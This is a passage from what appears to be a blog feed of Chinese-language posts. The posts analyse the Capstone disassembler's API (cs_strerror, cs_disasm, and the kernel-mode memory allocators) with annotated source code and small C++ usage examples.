code);</code></p><p>将上个API输出的错误码转换为详细错误信息</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> * CAPSTONE_API <span class="title">cs_strerror</span><span class="params">(cs_err code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(code) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Unknown error code"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_OK:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"OK (CS_ERR_OK)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MEM:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Out of memory (CS_ERR_MEM)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_ARCH:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid/unsupported architecture(CS_ERR_ARCH)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_HANDLE:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid handle (CS_ERR_HANDLE)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_CSH:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid csh (CS_ERR_CSH)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MODE:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid mode (CS_ERR_MODE)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_OPTION:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid option (CS_ERR_OPTION)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_DETAIL:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Details are unavailable (CS_ERR_DETAIL)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MEMSETUP:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Dynamic memory management uninitialized (CS_ERR_MEMSETUP)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_VERSION:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Different API version between core &amp; binding (CS_ERR_VERSION)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_DIET:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Information irrelevant in diet engine (CS_ERR_DIET)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_SKIPDATA:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Information irrelevant for 'data' instruction in SKIPDATA mode (CS_ERR_SKIPDATA)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_ATT:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"AT&amp;T syntax is unavailable (CS_ERR_X86_ATT)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_INTEL:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"INTEL syntax is unavailable (CS_ERR_X86_INTEL)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_MASM:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"MASM syntax is unavailable (CS_ERR_X86_MASM)"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例，结合cs_errno使用：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; cs_strerror(cs_errno(handle));  <span class="comment">//直接输出报错信息</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/22/5d35bc1db170a33360.jpg" alt></p><h3 id="cs-disasm"><a href="#cs-disasm" class="headerlink" title="cs_disasm"></a>cs_disasm</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> <span class="function">CAPSTONE_API <span class="title">cs_disasm</span><span class="params">(csh handle,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *code, <span class="keyword">size_t</span> code_size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> address,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_insn **insn)</span></span>;</span><br></pre></td></tr></table></figure><p>给定缓冲区、大小、地址和编号，反编译机器码<br>API动态地分配内存来包含分解的指令，生成的指令将放在*insn中</p><p>注意： 必须释放分配的内存，以避免内存泄漏。对于需要动态分配稀缺内存的系统(如OS内核或固件)，API cs_disasm_iter()可能是比cs_disasm()更好的选择。原因是，使用cs_disasm()时，基于有限的可用内存，必须预先计算要分解多少条指令。</p><p>handle: cs_open()返回的句柄<br>code: 包含要反汇编的机器码的缓冲区。<br>code_size:上面代码缓冲区的大小。<br>address:给定原始代码缓冲区中的第一条指令的地址。<br>insn: 由这个API填写的指令数组。注意: insn将由这个函数分配，应该用cs_free () API释放<br>count: 需要分解的指令数量，或输入0分解所有指令<br>return:成功反汇编指令的数量，如果该函数未能反汇编给定的代码，则为0，失败时，调用cs_errno()获取错误代码。</p><p>源码分析</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> <span class="function">CAPSTONE_API <span class="title">cs_disasm</span><span class="params">(csh ud, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *buffer, <span class="keyword">size_t</span> size, <span class="keyword">uint64_t</span> offset, <span class="keyword">size_t</span> count, cs_insn **insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line">MCInst mci;</span><br><span class="line"><span class="keyword">uint16_t</span> insn_size;</span><br><span class="line"><span class="keyword">size_t</span> c = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> f = <span class="number">0</span>;<span class="comment">// 缓存中下一条指令的索引</span></span><br><span class="line">cs_insn *insn_cache;<span class="comment">// 缓存反汇编后的指令</span></span><br><span class="line"><span class="keyword">void</span> *total = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_size = <span class="number">0</span>;<span class="comment">//所有insn的输出缓冲区的总大小</span></span><br><span class="line"><span class="keyword">bool</span> r;</span><br><span class="line"><span class="keyword">void</span> *tmp;</span><br><span class="line"><span class="keyword">size_t</span> skipdata_bytes;</span><br><span class="line"><span class="keyword">uint64_t</span> offset_org; <span class="comment">// 保存缓冲区的所有原始信息</span></span><br><span class="line"><span class="keyword">size_t</span> size_org;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *buffer_org;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cache_size = INSN_CACHE_SIZE;</span><br><span class="line"><span class="keyword">size_t</span> next_offset;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle) &#123;</span><br><span class="line"><span class="comment">// 修复方式:</span></span><br><span class="line"><span class="comment">// handle-&gt;errnum = CS_ERR_HANDLE;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重设ARM架构的IT block</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_ARM)</span><br><span class="line">handle-&gt;ITBlock.size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_USE_SYS_DYN_MEM</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; count &lt;= INSN_CACHE_SIZE)</span><br><span class="line">cache_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>) count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存SKIPDATA原始偏移量</span></span><br><span class="line">buffer_org = buffer;</span><br><span class="line">offset_org = offset;</span><br><span class="line">size_org = size;</span><br><span class="line"></span><br><span class="line">total_size = <span class="keyword">sizeof</span>(cs_insn) * cache_size;</span><br><span class="line">total = cs_mem_malloc(total_size);</span><br><span class="line"><span class="keyword">if</span> (total == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">// 内存不足</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insn_cache = total;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">MCInst_Init(&amp;mci);</span><br><span class="line">mci.csh = handle;</span><br><span class="line"></span><br><span class="line">mci.address = offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line"><span class="comment">//给detail指针分配内存</span></span><br><span class="line">insn_cache-&gt;detail = cs_mem_malloc(<span class="keyword">sizeof</span>(cs_detail));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">insn_cache-&gt;detail = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为non-detailed模式保存所有信息</span></span><br><span class="line">mci.flat_insn = insn_cache;</span><br><span class="line">mci.flat_insn-&gt;address = offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="comment">//mnemonic &amp; op_str0填充</span></span><br><span class="line">mci.flat_insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">mci.flat_insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">r = handle-&gt;disasm(ud, buffer, size, &amp;mci, &amp;insn_size, offset, handle-&gt;getinsn_info);</span><br><span class="line"><span class="keyword">if</span> (r) &#123;</span><br><span class="line">SStream ss;</span><br><span class="line">SStream_Init(&amp;ss);</span><br><span class="line"></span><br><span class="line">mci.flat_insn-&gt;size = insn_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将内部指令操作码映射到公共insn ID</span></span><br><span class="line">handle-&gt;insn_id(handle, insn_cache, mci.Opcode);</span><br><span class="line"></span><br><span class="line">handle-&gt;printer(&amp;mci, &amp;ss, handle-&gt;printer_info);</span><br><span class="line">fill_insn(handle, insn_cache, ss.buffer, &amp;mci, handle-&gt;post_printer, buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调整opcode (X86)</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_X86)</span><br><span class="line">insn_cache-&gt;id += mci.popcode_adjust;</span><br><span class="line"></span><br><span class="line">next_offset = insn_size;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 遇到中断指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为detail指针释放内存</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;skipdata || handle-&gt;skipdata_size &gt; size)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_setup.callback) &#123;</span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_setup.callback(buffer_org, size_org,</span><br><span class="line">(<span class="keyword">size_t</span>)(offset - offset_org), handle-&gt;skipdata_setup.user_data);</span><br><span class="line"><span class="keyword">if</span> (skipdata_bytes &gt; size)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skipdata_bytes)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_size;</span><br><span class="line"></span><br><span class="line">insn_cache-&gt;id = <span class="number">0</span>;</span><br><span class="line">insn_cache-&gt;address = offset;</span><br><span class="line">insn_cache-&gt;size = (<span class="keyword">uint16_t</span>)skipdata_bytes;</span><br><span class="line"><span class="built_in">memcpy</span>(insn_cache-&gt;bytes, buffer, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">insn_cache-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">insn_cache-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="built_in">strncpy</span>(insn_cache-&gt;mnemonic, handle-&gt;skipdata_setup.mnemonic,</span><br><span class="line"><span class="keyword">sizeof</span>(insn_cache-&gt;mnemonic) - <span class="number">1</span>);</span><br><span class="line">skipdata_opstr(insn_cache-&gt;op_str, buffer, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">insn_cache-&gt;detail = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">next_offset = skipdata_bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一条新指令进入缓存</span></span><br><span class="line">f++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反汇编了一条指令</span></span><br><span class="line">c++;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; c == count)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f == cache_size) &#123;</span><br><span class="line">cache_size = cache_size * <span class="number">8</span> / <span class="number">5</span>; </span><br><span class="line">total_size += (<span class="keyword">sizeof</span>(cs_insn) * cache_size);</span><br><span class="line">tmp = cs_mem_realloc(total, total_size);</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) &#123;<span class="comment">//内存不足</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">insn_cache = (cs_insn *)total;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; c; i++, insn_cache++)</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">*insn = <span class="literal">NULL</span>;</span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">total = tmp;</span><br><span class="line"><span class="comment">//在最后一条指令之后继续填充缓存</span></span><br><span class="line">insn_cache = (cs_insn *)((<span class="keyword">char</span> *)total + <span class="keyword">sizeof</span>(cs_insn) * c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将f重置为0，从一开始就填入缓存</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">insn_cache++;</span><br><span class="line"></span><br><span class="line">buffer += next_offset;</span><br><span class="line">size -= next_offset;</span><br><span class="line">offset += next_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!c) &#123;</span><br><span class="line"><span class="comment">//未反汇编任何指令</span></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">total = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (f != cache_size) &#123;</span><br><span class="line"><span class="comment">// 没有完全使用最后一个缓存，缩小大小</span></span><br><span class="line">tmp = cs_mem_realloc(total, total_size - (cache_size - f) * <span class="keyword">sizeof</span>(*insn_cache));</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) &#123;<span class="comment">// 内存不足</span></span><br><span class="line"><span class="comment">// 释放所有detail指针</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">insn_cache = (cs_insn *)total;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; c; i++, insn_cache++)</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">*insn = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">total = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*insn = total;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例，x86_64:<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);   <span class="comment">//所有指令，基址0x1000，放入insn</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出</p><p><img src="https://i.loli.net/2019/07/22/5d35c5087d17d31194.jpg" alt></p><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(三">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(三)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-三&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-三&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(三)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(二)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%BA%8C)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(二)/</id>
    <published>2019-07-21T04:55:52.086Z</published>
    <updated>2019-07-27T02:17:41.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-二"><a href="#Capstone反汇编引擎数据类型及API分析及示例-二" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(二)"></a>Capstone反汇编引擎数据类型及API分析及示例(二)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5761" target="_blank" rel="noopener">https://xz.aliyun.com/t/5761</a></p></blockquote><p>上篇分析了Capstone开放的数据类型，下面就来正式看看API吧<br>官方开放的API只有二十个左右，但为了能写的更易懂，我将结合实例，分多篇写。<br>API中作者将capstone缩写为cs，下面我也用这种方式描述</p><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-malloc-t"><a href="#cs-malloc-t" class="headerlink" title="cs_malloc_t"></a>cs_malloc_t</h3><p><code>void* (CAPSTONE_API *cs_malloc_t)(size_t size);</code></p><p>cs的动态内存分配，用于<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mem</span> &#123;</span></span><br><span class="line"><span class="keyword">cs_malloc_t</span> <span class="built_in">malloc</span>;</span><br><span class="line"><span class="keyword">cs_calloc_t</span> <span class="built_in">calloc</span>;</span><br><span class="line"><span class="keyword">cs_realloc_t</span> <span class="built_in">realloc</span>;</span><br><span class="line"><span class="keyword">cs_free_t</span> <span class="built_in">free</span>;</span><br><span class="line"><span class="keyword">cs_vsnprintf_t</span> vsnprintf;</span><br><span class="line">&#125; cs_opt_mem;</span><br></pre></td></tr></table></figure></p><p>cs_malloc_t定义于capstone.lib和capstone.dll的cs.c中，<br><img src="https://i.loli.net/2019/07/21/5d33f804831d248926.jpg" alt></p><blockquote><p>在用户模式下，cs_mem_malloc默认使用系统malloc</p><p>Windows driver模式下，<code>cs_malloc_t cs_mem_malloc = cs_winkernel_malloc;</code><br>cs_winkernel_malloc定义于\capstone-4.0.1\windows\winkernel_mm.c,</p></blockquote><p>实现代码<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 长度不能分配为0</span></span><br><span class="line">NT_ASSERT(size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FP; NonPagedPool用于支持 Windows 7 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> prefast(suppress : 30030)<span class="comment">// 分配可执行的POOL_TYPE内存</span></span></span><br><span class="line"><span class="keyword">size_t</span> number_of_bytes = <span class="number">0</span>;</span><br><span class="line">CS_WINKERNEL_MEMBLOCK *block = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 特定的值能造成溢出</span></span><br><span class="line"><span class="comment">// 如果value中的和超出或低于类型容量，函数将返回NULL。</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(RtlSizeTAdd(size, <span class="keyword">sizeof</span>(CS_WINKERNEL_MEMBLOCK), &amp;number_of_bytes))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">block = (CS_WINKERNEL_MEMBLOCK *)ExAllocatePoolWithTag(</span><br><span class="line">NonPagedPool, number_of_bytes, CS_WINKERNEL_POOL_TAG);</span><br><span class="line"><span class="keyword">if</span> (!block) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">block-&gt;size = size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> block-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>OSX kernel模式下，<code>cs_malloc_t cs_mem_malloc = kern_os_malloc;</code>，这里暂且不探讨。</p></blockquote><h3 id="cs-calloc-t"><a href="#cs-calloc-t" class="headerlink" title="cs_calloc_t"></a>cs_calloc_t</h3><p><code>void* (CAPSTONE_API *cs_calloc_t)(size_t nmemb, size_t size);</code></p><p>cs申请内存并初始化<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_calloc_t cs_mem_calloc = calloc;</code>,使用系统calloc<br>Windows driver模式： <code>cs_calloc_t cs_mem_calloc = cs_winkernel_calloc;</code><br>实现代码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_calloc</span><span class="params">(<span class="keyword">size_t</span> n, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> total = n * size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *new_ptr = cs_winkernel_malloc(total);</span><br><span class="line"><span class="keyword">if</span> (!new_ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> RtlFillMemory(new_ptr, total, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OSX kernel模式： <code>cs_calloc_t cs_mem_calloc = cs_kern_os_calloc;</code><br><img src="https://i.loli.net/2019/07/21/5d340703367d259403.jpg" alt><br>直接调用kern_os_malloc了</p><h3 id="cs-realloc-t"><a href="#cs-realloc-t" class="headerlink" title="cs_realloc_t"></a>cs_realloc_t</h3><p><code>void* (CAPSTONE_API *cs_realloc_t)(void *ptr, size_t size);</code></p><p>cs重新分配内存<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_realloc_t cs_mem_realloc = realloc;</code>,调用系统realloc<br>Windows driver模式： <code>cs_realloc_t cs_mem_realloc = cs_winkernel_realloc;</code></p><p>实现代码，可以看出是利用cs_winkernel_malloc重新申请</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> smaller_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> cs_winkernel_malloc(size);</span><br><span 